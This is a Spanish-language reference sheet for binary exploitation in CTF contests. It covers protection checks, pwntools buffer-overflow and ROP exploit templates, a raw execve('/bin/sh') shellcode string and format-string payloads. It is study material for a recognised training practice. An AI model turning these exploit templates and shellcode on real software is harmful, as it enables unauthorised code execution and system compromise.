# 💥 Guía de referencia de pwn y explotación de binarios para CTF

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Análisis inicial

```bash
# Comprobar protecciones
checksec binary

# Información del archivo
file binary
ldd binary        # Bibliotecas

# Ejecutarlo
./binary
ltrace ./binary   # Llamadas a bibliotecas
strace ./binary   # Llamadas al sistema
```

---

## 🛡️ Protecciones

| Protección | Descripción | Evasión |
|------------|-------------|--------|
| **NX** | Pila no ejecutable | ROP |
| **ASLR** | Direcciones aleatorias | Filtrar una dirección y calcular |
| **PIE** | Dirección base aleatoria del binario | Filtrar una dirección del binario |
| **Canary** | Valor de control de la pila | Filtrar el canario |
| **RELRO** | Protección de la GOT | Usar otras técnicas |

---

## 📏 Desbordamiento de búfer (buffer overflow)

### Encontrar el desplazamiento (offset)
```bash
# Usar pwntools
cyclic 200        # Generar un patrón
cyclic -l 0x6161616a  # Encontrar el desplazamiento

# Usar GDB
pattern create 200
pattern offset 0x6161616a
```

### Exploit básico (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Dirección de retorno

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming: programación orientada al retorno)

### Buscar gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# Gadgets habituales
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Para alinear la pila
```

### Cadena ROP (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Construir la cadena
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

### Linux de 64 bits

> **Contexto de arquitectura:** el fragmento de pwntools presupone un contexto adecuado para la arquitectura objetivo; el título no configura ese contexto. Véase [pwnlib.context](https://docs.pwntools.com/en/stable/context.html). Los offsets, direcciones y cadenas ROP son ejemplos que dependen del binario.
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manual
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Vulnerabilidades de cadenas de formato (format string)

```bash
# Filtrar valores
%p %p %p %p %p
%x %x %x %x %x

# Escribir
%n - escribir el número de bytes impresos
%hhn - escribir un byte
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Herramientas

| Herramienta | Uso |
|------|-----|
| **pwntools** | Biblioteca de Python para pwn |
| **GDB + GEF** | Depuración |
| **ROPgadget** | Buscar gadgets ROP |
| **one_gadget** | Buscar un gadget one-shot en libc |
| **checksec** | Comprobar protecciones |

---

## 📋 Lista de comprobación de pwn

```markdown
□ checksec binary
□ Encontrar una vulnerabilidad (desbordamiento o cadena de formato)
□ Calcular el desplazamiento
□ Comprobar protecciones
□ Construir el exploit (shellcode/ROP)
□ Probar en local
□ Adaptar al entorno remoto
```

---

**Volver a CTF:** [🏁 Resumen de CTF](./README.es.md)
